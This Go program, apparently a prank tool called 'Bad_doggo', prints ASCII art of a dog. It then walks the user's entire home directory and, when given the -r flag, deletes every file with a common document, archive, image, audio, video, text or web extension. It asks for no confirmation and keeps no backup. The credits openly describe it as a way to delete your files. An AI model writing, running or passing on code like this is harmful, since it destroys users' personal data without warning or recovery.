package main

import (
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
)

type Verbose uint8

const (
	none Verbose = iota
	info_mode
	error_mode
	both_mode
)

func main() {
	args := os.Args[1:]
	var verbosity Verbose
	var info_flag bool
	var errors_flag bool
	var rm bool

	for _, arg := range args {
		if arg == "-v" {
			verbosity = info_mode
			info_flag = true
		}

		if arg == "-e" {
			verbosity = error_mode
			errors_flag = true
		}

		if arg == "-V" {
			print_credits()
		}

		if arg == "-r" {
			rm = true
		}
	}

	if info_flag && errors_flag {
		verbosity = both_mode
	} else {
		if info_flag {
			verbosity = info_mode
		} else if errors_flag {
			verbosity = error_mode
		} else {
			verbosity = none
		}
	}

	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	eat_homework(usr.HomeDir, rm, verbosity)
}

func print_credits() {
	fmt.Printf("------ Bad_doggo -------\nBad doggo is a new inovative way to delete your files.\n")
	os.Exit(0)
}

func check_if_homework(file string) bool {
	ext := []string{"pdf", "doc", "dot", "wbk", "docx", "dotx", "dotm", "docb",
		"xls", "xlt", "xlm", "xlsx", "xlsm", "xltx", "xltm", "xlsb",
		"xla", "xlam", "xll", "xlw", "ppt", "pot", "pps", "pptx",
		"pptm", "potx", "potm", "ppam", "ppsx", "ppsm", "sldx", "sldm",
		"accdb", "accde", "accdt", "accdr", "one", "pub", "xps",
		"txt", "7z", "zip", "gz", "tar", "gzip", "jpg", "html",
		"xml", "bin", "mp3", "mp4", "rar"}

	extension := filepath.Ext(file)

	for _, e := range ext {
		if extension == "."+e {
			return true
		}
	}

	return false
}

func eat_homework(path string, rm bool, verbose Verbose) {
	fmt.Println("Doggo imma eat your homework.\n")
	s := `
	▓▓▀░░░░░░░░┌┌░░░░▀▓▓▓▓
	▓░░░░░░░░░░░░░░░░░░▀▓▓
	▌░░▌░░▄▀▀▀▄░░░▄▀▀▄░▌▐▓
	▌░░▐░▐░▄▄░░▌░▐░▄▄░▌▐░▓
	▓░░▐░▐▐▄▓▌▒▌░▐▐▄▓▌▌▌▐▓
	▓▓▄▌░░▀██▄▀░░░▀██▀░▀▓▓
	▓▓▓░░▀█▄░░░░░░░▀██▀░▒▓
	▓▓▌░░░░▀█▄▄▄▄▄▄▄▄▄▄█▀▓
	▓▓░░░▄░░░░▀▌▒▒▌▒▐▀░░▄▓
	▓▌░░░▒▀▄▄░▐▒░▒▐░▒▌▄▓▓▓
	▀░░░░░▒▒▐▓▓▒░░┘░▒▓▓▓▓▓
	░░░░░░▒▒▒▓▓▓▄▄▄▄▓▓▓▓▓▓
	`
	for _, c := range s {
		fmt.Print(string(c))
	}
	fmt.Println()
	if verbose == none {
		fmt.Println("Doggo eats homework")
	}
	filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			if verbose == both_mode || verbose == error_mode {
				fmt.Println(err)
			}
		}

		if info.IsDir() {
			return nil
		}

		if check_if_homework(info.Name()) {
			if verbose == info_mode || verbose == both_mode {
				fmt.Printf("Doggo eats homework %s\n", path)
			}
			if rm {
				os.Remove(path)
			}
		}

		return nil
	})
}
